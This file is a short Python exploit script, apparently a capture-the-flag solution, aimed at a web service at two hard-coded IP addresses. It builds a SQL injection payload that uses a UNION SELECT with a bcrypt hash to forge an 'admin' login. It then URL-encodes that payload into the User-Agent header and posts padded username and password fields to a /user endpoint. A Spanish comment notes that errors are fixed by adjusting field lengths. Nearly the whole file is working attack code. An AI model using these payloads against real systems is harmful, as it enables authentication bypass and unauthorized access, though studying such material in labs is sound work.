import requests
import urllib.parse

url = "http://192.168.86.21:1337"
url = "http://83.136.255.217:44860"

datos = """
Content-Type: application/json

{
        "username": "notexists' union select 1, 'admin', '$2a$12$b.yKvD33saD4bcl/9NaPcuqwig52PTSfaLo5DsnYncS8aBTp4caci'-- -",
        "password": "password123"
}
"""

datos =  urllib.parse.quote_plus(datos)
print(datos)

headers = {
    "User-Agent": "Mozilla/7.0" + datos
}

# Los errores simplemente se solucionan manipulando la longitud de username y password xD

data = {
    "username": "adminfwefewfewfewfwfefwefwasdasdasdssasaassadvasgdvghdasgvahvhsavhdgsavashdgv",
    "password": "njhkrghjergbjhergbjherbgehjgbrjehgbhjgrebhjgrebhjgerbhjgrebgjherbghjer"
}

r = requests.post(url + "/user", data=data, headers=headers)

print(r.text)